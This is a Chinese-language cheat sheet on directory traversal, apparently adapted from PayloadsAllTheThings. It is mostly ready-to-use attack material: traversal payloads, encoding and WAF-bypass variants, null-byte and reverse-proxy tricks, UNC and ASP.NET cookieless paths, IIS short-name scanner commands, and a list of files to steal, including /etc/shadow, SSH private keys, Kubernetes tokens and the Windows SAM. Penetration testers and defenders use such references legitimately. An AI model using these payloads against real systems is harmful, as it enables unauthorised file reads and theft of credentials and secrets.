# Directory Traversal - 目录遍历

[SEARCH_KEYWORDS]
漏洞类型: Directory Traversal Path Traversal 目录遍历 路径遍历
攻击类型: Arbitrary File Read LFI Local File Inclusion
关键词: ../ ..\ ..%2f %2e%2e dotdot slash traversal
编码: URL Encoding Double URL Encoding Unicode UTF-8 Overlong NULL Byte
技术: Mangled Path UNC Share ASPNET Cookieless IIS Short Name

[CONTENT]

## 目录遍历概述

路径遍历（目录遍历）是一种安全漏洞，攻击者通过操作引用文件的变量，使用`../`序列或类似构造来访问文件系统上的任意文件和目录。

## 基础Payload

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

## 编码绕过

### URL编码

| 字符 | 编码 |
|------|------|
| `.` | `%2e` |
| `/` | `%2f` |
| `\` | `%5c` |

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

### 双重URL编码

| 字符 | 编码 |
|------|------|
| `.` | `%252e` |
| `/` | `%252f` |
| `\` | `%255c` |

```
%255c%255c..%255c/..%255c/windows/win.ini
```

### Unicode编码

| 字符 | 编码 |
|------|------|
| `.` | `%u002e` |
| `/` | `%u2215` |
| `\` | `%u2216` |

```
/%u002e%u002e/%u002e%u002e/etc/passwd
```

### Overlong UTF-8

| 字符 | 编码 |
|------|------|
| `.` | `%c0%2e`, `%c0%ae` |
| `/` | `%c0%af`, `%c0%2f` |
| `\` | `%c0%5c` |

## 过滤绕过

### Mangled Path

当WAF删除`../`时：

```powershell
..././
...\.\
....//....//....//etc/passwd
```

### NULL字节

```
/.%00./.%00./etc/passwd
/../../../../etc/passwd%00.jpg
```

### 反向代理绕过

Nginx将`/..;/`视为目录，Tomcat视为`/../`：

```
..;/
/services/pluginscript/..;/..;/..;/getFavicon
```

## 特殊技术

### UNC Share (Windows)

```
\\localhost\c$\windows\win.ini
\\attacker\share\file
```

### ASP.NET Cookieless

```
/(S(X))/
/(Y(Z))/
/(S(X))/admin/(S(X))/main.aspx
```

### IIS短文件名

```powershell
java -jar iis_shortname_scanner.jar 20 8 'https://target/bin::$INDEX_ALLOCATION/'
shortscan http://example.org/
```

### Java URL Protocol

```
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

## 敏感文件路径

### Linux

```powershell
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cwd/
/home/$USER/.ssh/id_rsa
/home/$USER/.bash_history
/var/lib/mlocate/mlocate.db
/run/secrets/kubernetes.io/serviceaccount/token
```

### Windows

```powershell
C:\Windows\win.ini
C:\windows\system32\license.rtf
C:\inetpub\wwwroot\web.config
C:\windows\repair\sam
C:\unattend.xml
```

## 工具

- dotdotpwn - 目录遍历模糊测试工具
- IIS-ShortName-Scanner - IIS短文件名扫描
- shortscan - IIS短名称扫描

## 参考文档

原始来源: PayloadsAllTheThings/Directory Traversal/README.md